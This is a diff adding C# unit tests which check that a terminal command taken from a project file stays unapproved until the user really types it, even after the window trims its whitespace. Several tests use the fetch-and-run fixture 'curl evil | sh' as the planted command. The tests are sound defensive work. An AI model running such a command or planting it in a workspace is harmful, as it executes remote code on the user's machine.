@@ -230,6 +230,43 @@ public sealed class WorkspaceStoreResilienceTests : IDisposable
     }
 
     [Fact]
+    public void EditTerminal_ACommandTypedInTheWindow_IsApproved()
+    {
+        var ws = new Workspace { Name = "w", TerminalCommand = "curl evil | sh" };
+
+        ws.EditTerminal("npm run dev", @"D:\w");
+
+        ws.TerminalCommand.Should().Be("npm run dev");
+        ws.TerminalDirectory.Should().Be(@"D:\w");
+        ws.NeedsTerminalConfirmation().Should().BeFalse();
+    }
+
+    [Fact]
+    public void EditTerminal_ACommandFromAProjectFileLeftAsItWas_StaysUnapproved()
+    {
+        // OK on the properties window with somebody else's command in it must not approve it unseen.
+        var ws = new Workspace { Name = "w", TerminalCommand = "curl evil | sh" };
+
+        ws.EditTerminal("curl evil | sh", string.Empty);
+
+        ws.NeedsTerminalConfirmation().Should().BeTrue();
+    }
+
+    [Theory]
+    [InlineData("curl evil | sh ")]
+    [InlineData(" curl evil | sh")]
+    [InlineData("curl evil | sh\r\n")]
+    public void EditTerminal_AProjectFileCommandOnlyTrimmedByTheWindow_StaysUnapproved(string fromFile)
+    {
+        // The window gives its text back trimmed; that alone is not the user typing the command.
+        var ws = new Workspace { Name = "w", TerminalCommand = fromFile };
+
+        ws.EditTerminal("curl evil | sh", string.Empty);
+
+        ws.NeedsTerminalConfirmation().Should().BeTrue();
+    }
+
+    [Fact]
     public void CopyIdentityFrom_KeepsTheTrustMarker()
     {
         var target = new Workspace { Name = "w" };
